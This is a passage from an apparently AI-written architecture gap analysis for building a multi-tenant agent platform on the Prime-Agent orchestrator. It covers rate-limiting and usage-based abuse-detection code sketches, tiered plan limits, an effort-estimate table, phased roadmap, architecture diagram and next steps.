           await self.redis.expire(f"user:{user_id}:active_sessions", 3600)

           return True

       async def release_session_slot(self, user_id: str):
           await self.redis.decr(f"user:{user_id}:active_sessions")
   ```

5. **Abuse Detection**
   ```python
   class AbuseDetector:
       async def check_suspicious_activity(self, user_id: str) -> AbuseReport:
           # Pattern: Rapid session creation/deletion
           recent_sessions = await self.db.query("""
               SELECT COUNT(*)
               FROM sessions
               WHERE user_id = :user_id
                 AND created_at > NOW() - INTERVAL '5 minutes'
           """, {"user_id": user_id})

           if recent_sessions > 100:
               await self.flag_user(user_id, "rapid_session_creation")

           # Pattern: Excessive errors
           error_rate = await self.get_error_rate(user_id, minutes=15)
           if error_rate > 0.5:  # >50% errors
               await self.flag_user(user_id, "high_error_rate")

           # Pattern: Large storage usage in short time
           storage_growth = await self.get_storage_growth(user_id, hours=1)
           if storage_growth > 1_000_000_000:  # 1GB in 1 hour
               await self.flag_user(user_id, "rapid_storage_growth")
   ```

6. **Dynamic Rate Adjustment**
   ```python
   # Adjust limits based on plan tier
   class TieredRateLimits:
       limits = {
           "free": {
               "api_requests_per_hour": 1000,
               "concurrent_sessions": 2,
               "tokens_per_minute": 10_000
           },
           "pro": {
               "api_requests_per_hour": 10_000,
               "concurrent_sessions": 10,
               "tokens_per_minute": 100_000
           },
           "enterprise": {
               "api_requests_per_hour": 100_000,
               "concurrent_sessions": 100,
               "tokens_per_minute": 1_000_000
           }
       }

       async def get_limits(self, user_id: str) -> dict:
           user = await self.db.get_user(user_id)
           return self.limits[user.plan]
   ```

**Estimated Effort:** 2-3 weeks for basic rate limiting, 1-2 weeks for abuse detection

---

## Summary Table - Missing Components

| Component | Priority | Complexity | Est. Effort | Dependencies |
|-----------|----------|------------|-------------|--------------|
| Tool Security & Validation | 🔴 Critical | High | 3-4 weeks | Python AST, sandboxing |
| User Auth & Multi-Tenancy | 🔴 Critical | Medium | 3-5 weeks | JWT, PostgreSQL RLS |
| User-Facing API | 🔴 Critical | Medium | 3-4 weeks | FastAPI, DB schema |
| Tool Registry & Versioning | 🔴 Critical | High | 6-8 weeks | Validation pipeline |
| Secrets Management | 🔴 Critical | Medium | 2-3 weeks | Encryption, KMS |
| Multi-Tenant Storage | 🟡 Important | Medium | 3-4 weeks | S3, quotas |
| User Observability | 🟡 Important | Medium | 5-7 weeks | Metrics, dashboards |
| Billing Integration | 🟡 Important | Medium | 5-7 weeks | Stripe, invoicing |
| Dependency Management | 🟡 Important | High | 3-4 weeks | pip, venv, caching |
| Rate Limiting & Abuse | 🟡 Important | Medium | 3-5 weeks | Redis, monitoring |

**Total Estimated Effort (Critical Only):** ~20-30 weeks (5-7 months) with 2-3 developers
**Total Estimated Effort (All Components):** ~40-55 weeks (10-14 months) with 2-3 developers

---

## Recommended Development Phases

### Phase 1: Foundation (Weeks 1-12)
**Goal:** Secure, multi-tenant platform with basic user features

- [ ] User authentication & authorization (3 weeks)
- [ ] Database schema with user_id on all tables (1 week)
- [ ] User-facing API (agents CRUD, basic execution) (4 weeks)
- [ ] Tool registry with basic validation (4 weeks)

**Deliverable:** Users can create accounts, build agents with pre-approved tools, run sessions.

### Phase 2: Security & Reliability (Weeks 13-20)
**Goal:** Production-ready security and resource management

- [ ] Tool code validation & sandboxing (4 weeks)
- [ ] Secrets management (2 weeks)
- [ ] Rate limiting (2 weeks)

**Deliverable:** Users can write custom tool code securely, store secrets, platform prevents abuse.

### Phase 3: Observability & Billing (Weeks 21-32)
**Goal:** Users can monitor and pay for usage

- [ ] User logs & metrics APIs (4 weeks)
- [ ] Frontend dashboards (3 weeks)
- [ ] Billing integration (5 weeks)

**Deliverable:** Users have full visibility, platform generates revenue.

### Phase 4: Advanced Features (Weeks 33-45)
**Goal:** Power user features and optimization

- [ ] Tool dependency management (4 weeks)
- [ ] Multi-tenant storage (4 weeks)
- [ ] Advanced quota management (2 weeks)
- [ ] Tool marketplace (3 weeks)

**Deliverable:** Full-featured platform competitive with major providers.

---

## Architecture Diagram

```
┌───────────────────────────────────────────────────────────────┐
│                     FRONTEND (Web/Mobile)                      │
│         User Dashboard | Agent Builder | Logs | Billing       │
└────────────────────────────┬──────────────────────────────────┘
                             │
┌────────────────────────────┴──────────────────────────────────┐
│                   USER-FACING API GATEWAY                      │
│  ┌──────────┬──────────┬──────────┬──────────┬─────────────┐  │
│  │  Auth    │  Agents  │  Tools   │  Secrets │   Usage     │  │
│  │  /auth   │  /agents │  /tools  │ /secrets │   /usage    │  │
│  └──────────┴──────────┴──────────┴──────────┴─────────────┘  │
│                                                                 │
│  Middleware: Auth | Rate Limit | CORS | Logging                │
└────────────────────────────┬──────────────────────────────────┘
                             │
┌────────────────────────────┴──────────────────────────────────┐
│                    PLATFORM SERVICES LAYER                     │
│  ┌─────────────────┬──────────────────┬───────────────────┐   │
│  │ Tool Registry   │  Agent Registry  │  Secrets Vault    │   │
│  │ - Validation    │  - CRUD          │  - Encryption     │   │
│  │ - Versioning    │  - Ownership     │  - Injection      │   │
│  │ - Sandbox Env   │  - Composition   │                   │   │
│  └─────────────────┴──────────────────┴───────────────────┘   │
│                                                                 │
│  ┌─────────────────┬──────────────────┬───────────────────┐   │
│  │ Billing Service │  Metrics Service │  Storage Service  │   │
│  │ - Stripe        │  - Aggregation   │  - S3/Local       │   │
│  │ - Invoicing     │  - Dashboards    │  - Quotas         │   │
│  │ - Alerts        │  - Logs          │                   │   │
│  └─────────────────┴──────────────────┴───────────────────┘   │
└────────────────────────────┬──────────────────────────────────┘
                             │
┌────────────────────────────┴──────────────────────────────────┐
│              PRIME-AGENT SUPERVISOR (Unchanged)                │
│  ┌──────────┬──────────┬──────────┬──────────┬─────────────┐  │
│  │ Session  │ Journal  │ Sandbox  │ Policy   │   Harness   │  │
│  │ Manager  │ (Events) │ (Docker) │ (Quotas) │  (Versions) │  │
│  └──────────┴──────────┴──────────┴──────────┴─────────────┘  │
│                                                                 │
│  Contracts: AgentRuntime | ToolProvider | PromptAssembler |    │
│             SubagentTransport | ModelGateway | ContextMemory   │
└────────────────────────────┬──────────────────────────────────┘
                             │
┌────────────────────────────┴──────────────────────────────────┐
│                    INFRASTRUCTURE LAYER                        │
│  ┌──────────┬──────────┬──────────┬──────────┬─────────────┐  │
│  │PostgreSQL│  Redis   │    S3    │  Stripe  │   OpenAI    │  │
│  │  (Data)  │ (Cache)  │ (Storage)│ (Payment)│   (LLM)     │  │
│  └──────────┴──────────┴──────────┴──────────┴─────────────┘  │
└───────────────────────────────────────────────────────────────┘
```

---

## Key Insights

1. **Prime-Agent is the Orchestration Layer** - It handles session management, crash recovery, event journaling. This is solid and production-ready.

2. **You Need to Build the Platform Layer** - User management, tool registry, secrets, billing, observability. Prime-Agent doesn't (and shouldn't) provide this.

3. **Contract-Based Architecture Enables Team Independence** - Each team can own a service (Tool Registry, Billing, Secrets) and build independently.

4. **Security is Non-Negotiable** - User-written code execution requires multiple layers of defense (static analysis, sandboxing, resource limits, monitoring).

5. **Multi-Tenancy Must Be Foundational** - Adding `user_id` to everything later is painful. Design for multi-tenancy from day one.

6. **Observability is a Competitive Advantage** - Users will choose your platform if they can see exactly what their agents are doing and how much it costs.

---

## Next Steps

1. **Design database schema** with user_id, tenant_id on all tables
2. **Implement authentication** (JWT + user registration)
3. **Build user-facing API** (agents CRUD, basic execution)
4. **Implement tool validation pipeline** (static analysis + sandboxing)
5. **Add secrets management** (encrypted storage + runtime injection)
6. **Integrate billing** (Stripe + usage tracking)
7. **Build observability** (logs, metrics, dashboards)

---

**Document Version:** 1.0
**Last Updated:** 2026-08-26
**Author:** Claude Code Analysis
